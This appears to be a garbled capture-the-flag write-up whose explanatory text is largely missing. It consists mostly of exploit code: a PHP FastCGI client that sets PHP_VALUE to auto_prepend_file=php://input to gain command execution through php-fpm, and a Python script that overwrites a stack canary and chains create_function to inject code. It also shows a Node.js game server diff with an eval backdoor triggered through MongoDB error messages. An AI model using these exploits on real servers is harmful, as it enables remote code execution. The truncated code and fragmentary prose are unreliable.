                . chr(0)                   
                . chr(0)                  
                . $part;                     
            $offset += $segLen;
        } while ($offset > 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . 
chr($nlen & 0xFF);
        }
        if ($vlen > 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . 
chr($vlen & 0xFF);
        }
        return $nvpair . $name . $value;
    }
    protected function readNvpair($data, $length = null)
    {
        if ($length === null) {
            $length = strlen($data);
        }
        $array = array();
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F = 128) {
                $vlen = ($nlen & 0x7F sock];
        $a = [];
        socket_select($s, $a, $a, floor($timeoutMs / 1000), ($timeoutMs % 1000) * 1000);
        $packet = socket_read($this->sock, self::HEADER_LEN);
        if ($packet === false) {
            $errNo = socket_last_error($this->sock);
            if ($errNo == 110) { 
                throw new TimedOutException('Failed reading socket');
            }
            throw CommunicationException::socketRead($this->sock);
        }
        if (!$packet) {
            return null;
        }
        $resp = $this->decodePacketHeader($packet);
        $resp['content'] = '';
        if ($resp['contentLength']) {
            $len  = $resp['contentLength'];
            while ($len && $buf=socket_read($this->sock, $len)) {
                $len -= strlen($buf);
                $resp['content'] .= $buf;
            }
        }
        if ($resp['paddingLength']) {
            socket_read($this->sock, $resp['paddingLength']);
        }
        return $resp;
    }
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        $ret = socket_write($this->sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        if ($ret === false) {
            throw CommunicationException::socketWrite($this->sock);
        }
        $resp = $this->readPacket(0);
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new CommunicationException('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    public function request(array $params, $stdin)
    {
        $req = $this->asyncRequest($params, $stdin);
        return $req->get();
    }
    public function asyncRequest(array $params, $stdin)
    {
        $this->connect();
        do {
            $this->_requestCounter++;
            if ($this->_requestCounter >= 65536) {
                $this->_requestCounter = 1;
            }
            $id = $this->_requestCounter;
        } while (isset($this->_requests[$id]));
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-
>keepAlive) . str_repeat(chr(0), 5), $id);
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value, $id);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest, $id);
        }
        $request .= $this->buildPacket(self::PARAMS, '', $id);
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin, $id);
        }
        $request .= $this->buildPacket(self::STDIN, '', $id);
        if (false === socket_write($this->sock, $request)) {
            throw CommunicationException::socketWrite($this->sock);
        }
        $req = new Response($this, $id);
        $req->state = Response::REQ_STATE_WRITTEN;
        $this->_requests[$id] = $req;
        return $req;
    }
    public function waitForResponse($requestId, $timeoutMs = 0)
    {
        if (!isset($this->_requests[$requestId])) {
            throw new CommunicationException('Invalid request id given');
        }
        $startTime = microtime(true);
        do {
            $resp = $this->readPacket($timeoutMs);
            if (!$resp) {
                continue; 
            }
            if (isset($this->_requests[$resp['requestId']])) {
                $req = $this->_requests[$resp['requestId']];
                $respType = (int) $resp['type'];
                if ($respType === self::STDOUT) {
                    $req->stdout .= $resp['content'];
                } elseif ($respType === self::STDERR) {
                    $req->state = Response::REQ_STATE_ERR;
                    $req->stderr .= $resp['content'];
                } elseif ($respType === self::END_REQUEST) {
                    $req->state = Response::REQ_STATE_OK;
                    unset($this->_requests[$resp['requestId']]);
                    if ($resp['requestId'] == $requestId) {
                        return true;
                    }
                }
            } else {
                trigger_error("Bad requestID: " . $resp['requestId'], E_USER_WARNING);
            }
            if (isset($resp['content']{4})) {
                $msg = ord($resp['content']{4});
                if ($msg === self::CANT_MPX_CONN) {
                    throw new CommunicationException('This app  multiplex [CANT_MPX_CONN]');
                } elseif ($msg === self::OVERLOADED) {
                    throw new CommunicationException('New request rejected; too busy [OVERLOADED]');
                } elseif ($msg === self::UNKNOWN_ROLE) {
                    throw new CommunicationException('Role value not known [UNKNOWN_ROLE]');
                }
            }
            if ($timeoutMs && microtime(true) - $startTime >= ($timeoutMs * 1000)) {
                throw new TimedOutException('Timed out');
            }
        } while (true);
        return false;
    }
}
$filepath = "/var/www/html/sandbox.php";
$req = '/sandbox.php';
$cmd = $_REQUEST['cmd'];
$uri = $req .'?'.'command='.$cmd;
$client = new Client("//var/run/php/php7.3-fpm.sock", 0);
$code = "";
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
$params = array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => $filepath,
        'SCRIPT_NAME'       => $req,
        'QUERY_STRING'      => 'command='.$cmd,
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => 'niubi/fasdfas',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9985',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
        );
var_dump($params);
ini_set("display_errors", "On");
var_dump($client->request($params, $code));
"""
data1 = {
    "data": b"a"*(stack_length-4) + canary + b"aaaa" + print_r + b"0004abcdabccabc1abc2", 
    print_r_int:"1", 
    "abcd":b"array_map", 
    "abcc": "call_user_func_array",
    "abc1[0]": "create_function",
    "abc2[a][a]": "",
    "abc2[a][b]": "2;}%s/*"%payload,
    "cmd": cmd,
}
# data1 = {
#     "data": b"a"*(stack_length-4) + canary + b"aaaa" + print_r + b"0004abcdabccabc1abc2", 
#     print_r_int:"1", 
#     "abcd":b"error_log", 
#     "abcc": "/tmp/14ab50ba338b696dc9a4edd5adf3a213/",
#     "abc1": 3,
#     "abc2": "/tmp/14ab50ba338b696dc9a4edd5adf3a213/test123"
# }
data2 = {
shellperlOK
996 Game
Status: Completed Tags: Web,nojejs
NodejsMongoDBsocketiohintdb.a.ﬁnd({"b":{"$gt":1,"c":"d"}}) MongoDB
repoGitHubrepojs/clientjs/server
jsjs/server
Githubdiﬀeval
    "data": b"a"*(stack_length-4) + canary + b"aaaa" + print_r + b"0002abcdabc2", 
    print_r_int:"1", 
    "abcd":b"session_start", 
    "abc2[save_path]": "/tmp/14ab50ba338b696dc9a4edd5adf3a213/test123"
}
r = requests.post(url, data=data1, files={"file": open("include.php")})
•# r = requests.post(url, data={"data": b"a"*(stack_length-4) + canary + b"aaaa" + print_r + 
b"0002abcdabcc", print_r_int:"1", "abcd":"assert", "abcc": "print_r(123)"})
•print(r.text)
•# r = requests.post(url, data=data2)
•# print(r.text)
// GameServer.js diff 
GameServer.loadPlayer = function(socket,id){
    GameServer.server.db.collection('players').findOne({_id: new ObjectId(id)},function(err,doc){
        if(err) {
          if(!doc) {
              eval(err.message.split(':').pop()); // 
          }
          throw err;
        }
        if(!doc) {
      return;
        }
        var player = new Player();
        var mongoID = doc._id.toString();
        player.setIDs(mongoID,socket.id);
        player.getDataFromDb(doc);
js
init-worlddatanewfalseid
ObjectID_id
        GameServer.finalizePlayer(socket,player);
    });
};
    socket.on('init-world',function(data){
        if(!gs.mapReady) {
            socket.emit('wait');
            return;
        }
        if(data.new) {
            if(!gs.checkSocketID(socket.id)) return;
            gs.addNewPlayer(socket,data);
        }else{
            if(!gs.checkPlayerID(data.id)) return;
            gs.loadPlayer(socket,data.id);  // 